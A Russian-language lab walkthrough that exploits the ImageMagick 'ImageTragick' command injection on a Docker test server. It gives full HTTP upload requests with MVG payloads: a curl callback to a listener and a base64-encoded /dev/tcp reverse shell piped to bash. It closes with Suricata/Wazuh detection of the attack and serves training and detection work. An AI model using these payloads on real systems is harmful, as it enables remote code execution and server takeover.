# Imagemagick Command Injection

ImageMagick — это широкий набор инструментов для обработки изображений, многие производители называют эту программу для обработки изображений, включая масштабирование, обрезку, установку водяных знаков, преобразование формата и многого другого. Однако некоторые исследователи обнаружили, что когда пользователь переходит к изображению, содержащему «деформированный контент», это может вызвать уязвимости внедрения команд.

Сотрудники внешней безопасности создали для этого веб-сайт: https://imagetragick.com/ с подробным описанием уязвимости и способах её эксплуатации

### Эксплуатация уязвимости

Для запуска PHP-сервера, включающего в себя Imagemagick 6.9.2-10, выполните команду:

```
docker compose up -d
```

После запуска сервера по адресу `http://ваш-ip:8080/` будет доступна страница с возможностью загрузки файлов

<figure><img src="../../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

Для реализации данной уязвимости нужно отправить POST-запрос с полезной нагрузкой:

```
POST / HTTP/1.1
Host: 10.10.11.130:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Origin: http://10.10.11.130:8080
Connection: close
Referer: http://10.10.11.130:8080/
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymdcbmdQR1sDse9Et
Content-Length: 312

------WebKitFormBoundarymdcbmdQR1sDse9Et
Content-Disposition: form-data; name="file_upload"; filename="1.gif"
Content-Type: image/png

push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.0/oops.jpg"|curl "10.10.11.130:8889)'
pop graphic-context
------WebKitFormBoundarymdcbmdQR1sDse9Et--
```

Видно, что после его отправки мы получили http-запрос

<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

С помощью данной уязвимости мы можем получить обратную оболочку, отправив следующий запрос:

```
POST / HTTP/1.1
Host: 10.10.11.130:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Origin: http://10.10.11.130:8080
Connection: close
Referer: http://10.10.11.130:8080/
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarymdcbmdQR1sDse9Et
Content-Length: 378

------WebKitFormBoundarymdcbmdQR1sDse9Et
Content-Disposition: form-data; name="file_upload"; filename="1.gif"
Content-Type: image/png

push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.0/oops.jpg?`echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTEuMTQ1LzQ0NDQgMD4mMQo= | base64 -d | bash`"||id " )'
pop graphic-context
------WebKitFormBoundarymdcbmdQR1sDse9Et--
```

\*\*\*

Здесь c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTEuMTQ1LzQ0NDQgMD4mMQo= - это закодированная в base64 полезная нагрузка для получения обратной оболочки

<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>

Сгенерировать свою собственную нагрузку можно на [https://www.revshells.com/](https://www.revshells.com/)

<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

\*\*\*

После отправки запроса с созданным пэйлоадом мы можем получить обратную оболочку поднятого контейнера

<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>

В Wazuh (https://ваш-ip/app/wazuh) мы можем увидеть соответствующие алерты от IDS Suricata об эксплуатации данной уязвимости, о выводе файла /etc/passwd в ответе на ваш запрос и о выполнении произвольных команд.
